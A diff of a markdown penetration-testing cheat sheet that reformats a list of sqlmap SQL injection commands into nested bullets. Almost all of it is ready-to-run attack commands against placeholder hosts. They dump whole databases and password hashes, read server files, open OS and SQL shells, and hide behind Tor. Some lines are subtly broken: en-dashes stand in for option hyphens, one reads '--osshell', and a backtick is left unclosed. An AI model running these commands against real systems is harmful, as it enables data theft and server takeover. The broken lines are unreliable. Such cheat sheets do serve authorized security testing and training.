@@ -1806,69 +1806,88 @@ Client, Web and Password Attacks
 
     -   SQLMap Examples
 
-> **Crawl the links**  
-> sqlmap -u http://$ip --crawl=1  
-> sqlmap -u http://meh.com --forms --batch --crawl=10
-> --cookie=jsessionid=54321 --level=5 --risk=3  
-> **SQLMap Search for databases against a suspected GET SQL Injection
-> point ‘search’**  
-> sqlmap –u http://$ip/blog/index.php?search –dbs
->
-> **SQLMap dump tables from database oscommerce at GET SQL injection
-> point ‘search’**  
-> sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables
-> –dumps  
-> **SQLMap GET Parameter command**  
-> sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump
-> -threads=5  
-> **SQLMap Post Username parameter**  
-> sqlmap -u http://$ip/login.php --method=POST
-> --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3
-> --level=5 --dbms=MySQL --dump-all  
-> **SQL Map OS Shell**  
-> sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  
-> sqlmap -u http://$ip/login.php --method=POST
-> --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3
-> --level=5 --dbms=MySQL --os-shell  
-> **Automated sqlmap scan**  
-> sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  
-> --level=3 --current-user --current-db --passwords  
-> --file-read="/var/www/blah.php"  
-> **Targeted sqlmap scan**  
-> sqlmap -u "http://meh.com/meh.php?id=1"  
-> --dbms=mysql --tech=U --random-agent --dump  
-> **Scan url for union + error based injection with mysql backend  
-> and use a random user agent + database dump  
-> **sqlmap -o -u http://$ip/index.php --forms --dbs  
-> sqlmap -o -u "http://$ip/form/" --forms  
-> sqlmap check form for injection  
-> sqlmap -o -u "http://$ip/vuln-form" --forms  
-> -D database-name -T users --dump  
-> sqlmap dump and crack hashes for table users on database-name.
->
-> Enumerate databases  
-> sqlmap --dbms=mysql -u "$URL" --dbs  
-> Enumerate tables from a specific database  
-> sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  
-> Dump table data from a specific database and table  
-> sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump  
-> Specify parameter to exploit  
-> sqlmap --dbms=mysql -u
-> "http://www.example.com/param1=value1&param2=value2" --dbs -p param2  
-> Specify parameter to exploit in 'nice' URIs  
-> sqlmap --dbms=mysql -u
-> "http://www.example.com/param1/value1\*/param2/value2" --dbs \#
-> exploits param1  
-> Get OS shell  
-> sqlmap --dbms=mysql -u "$URL" --os-shell  
-> Get SQL shell  
-> sqlmap --dbms=mysql -u "$URL" --sql-shell  
-> SQL query  
-> sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT \*
-> FROM $TABLE;"  
-> Use Tor Socks5 proxy  
-> sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL"
-> --dbs
+      - Crawl the links
+      
+         `sqlmap -u http://$ip --crawl=1`
+         
+         `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
+         
+         
+      - SQLMap Search for databases against a suspected GET SQL Injection 
+      
+         `sqlmap –u http://$ip/blog/index.php?search –dbs`
+
+      - SQLMap dump tables from database oscommerce at GET SQL injection
+      
+         `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps `
+      
+      - SQLMap GET Parameter command  
+      
+          `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5  `
+          
+      - SQLMap Post Username parameter
+      
+           `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`
+           
+      - SQL Map OS Shell
+            
+            `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  `
+      
+            `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`
+            
+       - Automated sqlmap scan
+       
+             `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`
+             
+        - Targeted sqlmap scan
+        
+              `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`
+              
+         - Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
+         
+               `sqlmap -o -u http://$ip/index.php --forms --dbs  `
+               
+                `sqlmap -o -u "http://$ip/form/" --forms`
+                
+          - Sqlmap check form for injection  
+          
+                 `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
+                 
+           - Enumerate databases  
+           
+                 `sqlmap --dbms=mysql -u "$URL" --dbs`
+                 
+            - Enumerate tables from a specific database  
+                  
+                  `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
+                  
+            - Dump table data from a specific database and table  
+            
+                   `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
+                   
+             - Specify parameter to exploit  
+             
+                    `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
+                    
+             - Specify parameter to exploit in 'nice' URIs (exploits param1)
+             
+                     `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
+                     
+              - Get OS shell  
+              
+                       `sqlmap --dbms=mysql -u "$URL" --os-shell`
+                       
+               - Get SQL shell  
+                        
+                        `sqlmap --dbms=mysql -u "$URL" --sql-shell`
+                        
+                - SQL query  
+                
+                         `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;" 
+                         
+                 - Use Tor Socks5 proxy  
+                 
+                           `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
 
 -   Password Attacks
     --------------------------------------------------------------------------------------------------------------
